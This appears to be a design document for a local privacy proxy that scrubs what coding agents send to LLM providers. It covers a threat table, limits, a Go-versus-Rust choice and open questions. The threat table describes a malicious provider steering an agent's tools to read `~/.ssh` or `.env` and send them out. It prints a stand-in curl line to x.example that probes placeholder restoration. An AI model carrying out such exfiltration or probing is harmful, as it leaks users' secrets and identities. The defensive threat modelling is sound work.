| Sev. | Channel | Example | Mitigation | Residual |
|---|---|---|---|---|
| **Critical** | The provider steers the agent's tools to send data out | A tool call reads `~/.ssh` or `.env`, then runs `curl`, `git push`, `npm publish`, a DNS lookup or an MCP call | **Outer Seatbelt jail** on the whole agent process tree that allows only `127.0.0.1:<tacita>` ([srt](https://github.com/anthropics/sandbox-runtime)). Tacita acts as the HTTP CONNECT egress allowlist. Claude Code sandbox with `httpProxyPort` set to Tacita, `allowUnsandboxedCommands:false`, `failIfUnavailable:true` ([sandboxing](https://code.claude.com/docs/en/sandboxing)). Wrap background agents with `processWrapper` and MCP servers and hooks with `CLAUDE_CODE_SHELL_PREFIX`. Never use `bypassPermissions` or `--yolo` with untrusted providers. Use permission deny rules: the sandbox's `denyRead` does **not** stop the Read tool. | Domain fronting through allowlisted hosts. DNS exfiltration in a pf-only setup. |
| **Critical** | Restoration used as a de-anonymization oracle | `curl https://x.example/?q=project_x01`, or `echo project_x01 \| base64` whose output comes back unscrubbed | R19 (restore toward allowlisted destinations only). Scan tool results for encoded and transformed variants. Flag text-transforming commands in `watch`. srt's credential mask mode follows the same idea. | Clever transforms (state this honestly). |
| **Critical** | Credentials in headers | No gateway credential set, so the claude.ai OAuth token reaches Tacita; or `x-api-key`; or `ANTHROPIC_CUSTOM_HEADERS` | Set `ANTHROPIC_AUTH_TOKEN` to a random local token. Drop all inbound auth headers. Inject the provider key from the Keychain. Return 401 to requests without the token, and reject the OAuth beta value ([llm-gateway](https://code.claude.com/docs/en/llm-gateway)). | none |
| **Critical** | Metadata that is not prompt text | Codex `x-codex-turn-metadata` / `client_metadata` carry `workspaces` (absolute repo path, git remote, HEAD hash, has_changes), plus `x-codex-installation-id`, `tool_namespaces_info` and the User-Agent ([responses_metadata.rs](https://github.com/openai/codex/blob/main/codex-rs/core/src/responses_metadata.rs), [default_client.rs](https://github.com/openai/codex/blob/main/codex-rs/login/src/auth/default_client.rs)). Claude Code: `metadata.user_id` (format unverified), session, agent and parent-agent ID headers, and an attribution fingerprint in the prompt. | Header and field policy (§4.4). `CLAUDE_CODE_ATTRIBUTION_HEADER=0`. ### What Tacita cannot protect against (to state in the README)

1. **Inference from what remains:** domain logic, quasi-identifiers, writing style. Substitution does not stop a model from guessing who "company_x01" is.
2. **Anything sent before it was detected,** and anything the user chose to allow, including images and documents.
3. **A provider's own handling** of the scrubbed text and its metadata (retention, training). Routing flags only reduce this.
4. **An active provider using jail-allowed paths:** domain fronting through allowlisted hosts, DNS-encoded exfiltration when only pf is used, and transforms clever enough to beat the encoded-variant scan.
5. **Clients that call vendors themselves:** Cursor sends custom-endpoint requests from its own servers ([forum](https://forum.cursor.com/t/problem-reaching-openai-error-on-a-local-model-with-overriden-base-url/3975)); VS Code inline completions; Claude Desktop downloads; fast-mode checks.
6. **Local plaintext copies** kept by the clients, and **malware already running as the user**.
7. **Correctness of the model's own code** when it mixes placeholders in ways no rule anticipates. Tacita can detect leftover placeholders, but cannot guarantee the meaning of the code is right.

## 8. Stack recommendation

**Recommendation: Go 1.26+.** Upgrade from 1.17.13 first. `encoding/json/jsontext` is in the Go 1.27 standard library ([pkg.go.dev](https://pkg.go.dev/encoding/json/jsontext@go1.27.2)).
- **Daemon:** a `CGO_ENABLED=0` binary built on stdlib `net/http`, with a custom SSE relay.
- **`tacita watch`:** a separate Bubble Tea v2 process over a Unix socket.
- **ML:** an optional sidecar.
- **Distribution:** a Homebrew formula in a personal tap built from source, or `go install`. Homebrew 5 is disabling casks that fail Gatekeeper checks from September 2026, so an unsigned cask with an xattr hook works against Homebrew's direction ([Homebrew 5.0](https://brew.sh/2025/11/12/homebrew-5.0.0/), [GoReleaser deprecations](https://goreleaser.com/deprecations/)). Notarize later.

Why Go:
- **Readability for the owner.** The core is small and synchronous-looking, which serves the user's main requirement: understanding exactly how the code works.
- **Proven in this space.** Several Go projects have already built proxies of this kind: llm-dlp, Kiji, VibeGuard, anonde, PackyCode privacy-filter.
- **Secrets tooling.** The gitleaks rules target RE2 syntax, which Go's stdlib `regexp` runs in linear time with no cgo. I expect most rules to compile, but that has not been verified here.
- **Small dependency surface.** For a tool that holds every provider key and sees every prompt, this matters (see LiteLLM's compromise, [source](https://simonwillison.net/2026/Mar/24/malicious-litellm/)). Expect a handful of dependencies: Bubble Tea/Lip Gloss, an Aho-Corasick package, `mvdan.cc/sh`, `filippo.io/age`.
- **Distribution.** A single static binary, which is also why Codex moved off Node ([InfoQ](https://www.infoq.com/news/2025/06/codex-cli-rust-native-rewrite)).
- **Performance is not the deciding factor.** At single-user load every candidate stack proxies fast enough. Detection latency and distribution are what matter.

**Weak spots, with mitigations:**
- **No Go GLiNER.** Use an optional sidecar (`tacita-ner`) over a Unix socket, either Rust gline-rs on ONNX Runtime 1.23.2 for Intel, or a pinned Python 3.12 venv. Fail closed if the sidecar is configured but down. hugot is tested only on amd64-linux; onnxruntime_go needs cgo ([hugot](https://github.com/knights-analytics/hugot), [onnxruntime_go](https://github.com/yalue/onnxruntime_go)).
- **Betterleaks as a library.** It brings about 23 direct dependencies and RE2 compiled to WebAssembly ([go.mod](https://github.com/betterleaks/betterleaks)). Prefer vendoring the rule data and running it on stdlib `regexp`.
- **macOS Keychain from pure Go** usually means cgo or calling `/usr/bin/security`. Read through the CLI (`find-generic-password -w`). Never pass secrets as command-line arguments.
- **tree-sitter needs cgo.** Use a small comment/string lexer instead, or put tree-sitter in the sidecar.

**Main alternative: Rust.** Stack: hyper/axum, `aho-corasick`, `regex`, serde_json with raw values, `ort` + `tokenizers` + gline-rs, Ratatui. Codex itself uses this shape. Choose Rust if in-process GLiNER is needed from day one, or for maximum performance. Costs:
- a steeper learning curve, which works against "I am sure of the way it works";
- `ort` is still at release candidate (rc.15);
- on Intel you must pin the 1.23 API (`api-23`) and link a 1.23.2 dylib ([crates.io gline-rs](https://crates.io/crates/gline-rs), [ONNX Runtime 1.24.1 notes](https://github.com/microsoft/onnxruntime/releases/tag/v1.24.1)).

**Not recommended for the daemon:**
- **TypeScript/Bun** (PasteGuard lineage): it needs a runtime and has a large npm surface.
- **Python** (PrivAiTe): heavy dependencies; LiteLLM's supply-chain incident. Python is still the best place for the offline `tacita eval` harness (Presidio, GLiNER, OPF comparisons).

| Criterion | Go | Rust | TS/Bun | Python |
|---|---|---|---|---|
| Owner can read and modify it | ++ | + | + | ++ |
| Single binary, small dependencies | ++ | ++ | − | −− |
| SSE / HTTP in the stdlib | ++ | + (crates) | + | + |
| Secret rules reuse | ++ (RE2 rules) | + (Kingfisher) | − | + |
| In-process ML NER | − (sidecar) | ++ | − | ++ |
| TUI | ++ (Bubble Tea) | + (Ratatui) | + (Ink) | + (Textual; company wound down, project continues) |
| Intel Mac ML | ORT 1.23.2 via cgo or sidecar | ORT 1.23.2 pinned | onnxruntime-node | torch 2.2.2 pin |

## 10. Open questions

### 10.1 Product decisions only the user can make

1. **Threat model.** Protect against a passive, logging provider only (proxy plus flags), or also against an active, malicious one? The second needs the network jail, `tacita run`, restricted restoration into network tools, and changes "zero UX change" (one launcher word, some features disabled).
2. **Secrets (decision 1 refinement).** Never restore (`[SECRET_n]`, strict), or allow restoring a format-preserving synthetic value **only** into edits of the file it came from (so `.env` edits don't break)?
3. **Placeholder look.** `project_1` (as originally imagined) or `project_x01` (recommended: avoids the camel/flat collision)? English kind words everywhere, or French ones for French content? Include a static legend and instruction in the system prompt, or keep it opt-in?
4. **Placeholder lifetime.** Stable across sessions (readable, cache-friendly, but linkable by the provider over months) or per session (unlinkable, SlotGuard style)? Configurable per entity?
5. **Mid-session decisions in `watch`.** Rename and allow apply from the next session (recommended), or immediately (breaks cache and preserved thinking for that session)?
6. **No-decision behaviour.** When a tool call needs a decision and `watch` is closed: block it and end the turn (fail closed), or pause briefly (bounded by Claude Code's ~5–10 minute watchdog)?
7. **Fail-closed false positives.** ML candidates are hidden by default (decision 4). At what confidence? Should well-known public entities (a listed client) get a "public" class that stays visible unless marked private?
8. **ML latency budget.** Strict (wait for the full scan) or balanced (about 300 ms cap, with a heuristic fallback for anything left unscanned)?
9. **Dictionary seeding sources** allowed at install: git authors and emails, GitHub org/repo names, `~/code` folder names, macOS Contacts, Calendar?
10. **Images and PDFs.** Always block for untrusted providers, or OCR and allow when nothing matches?
11. **Network-bound tool calls containing placeholders:** block, ask, or let them run unrestored (the agent sees a failure)?
12. **Features you accept to lose:** auto-update (manual brew updates instead), WebSearch, claude.ai connectors, Remote Control, voice dictation, the Artifact tool, possibly the git snapshot in context.
13. **Target hardware.** This laptop is an Intel i9-9880H. Is it the long-term target, or will Tacita also run on Apple Silicon? That decides the ML runtime and the latency budget.
14. **Language: Go or Rust,** given your own comfort reading each.
15. **Codex auth.** API-key providers only, or also the ChatGPT-subscription Codex route that PasteGuard and llm-dlp use, whose terms-of-service position is unclear?
16. **Which providers and models** you trust on OpenRouter (an `only` list), and whether to set ZDR and no-training at account level.
17. **Business chat:** default policy for amounts and dates; French or English placeholders in prose.
18. **Mapping-file backups:** exclude it from Time Machine (confidentiality) and offer an encrypted export, or allow encrypted backups?

### 10.2 Technical unknowns (answerable by tests)

- Does OpenRouter `/api/v1/messages` handle Claude Code's full payload for GLM, Kimi, DeepSeek and Qwen: adaptive thinking, `role:"system"` entries, parallel tool use, `cache_control`? Are thinking and effort mapped to `reasoning`? **This is the biggest premise of v1.**
- Does OpenRouter `/responses` accept everything Codex sends (reasoning items, `custom_tool_call`, `include`, `prompt_cache_key`)? Is `provider.data_collection` / `zdr` enforced on `/messages` and `/responses`? The docs only show it for Chat Completions.
- The exact current format of `metadata.user_id`. Community captures only; needs a mitmproxy capture.
- Does a `PreToolUse` `updatedInput` change what Claude Code stores in history (Design B)?
- How faithfully do open-weight models copy identifier-shaped placeholders in code and French prose? No benchmark exists.
- Codex model-catalog response format for `GET /models?client_version=`.
- Does Codex's git enrichment have a config switch? Does a logged-out Codex contact chatgpt.com?
- With a gateway credential set but a claude.ai login still saved, are connectors or the Artifact tool still active by default?
- Does PasteGuard's extraction of thinking-block text break signatures in practice?
- Do macOS pf `user` rules work for outbound sockets on 15.x? How long will `sandbox-exec` keep working?
- Runtime of gliner2 in a Python 3.12 venv on Intel (dependency resolution verified, runtime not).
- Do the gitleaks rules compile cleanly on Go `regexp`?
- Does the WebSearch server-tool definition reaching OpenRouter get rejected, ignored or executed?
- Claude Desktop third-party mode: how uploaded files are sent (base64 document vs extracted text).
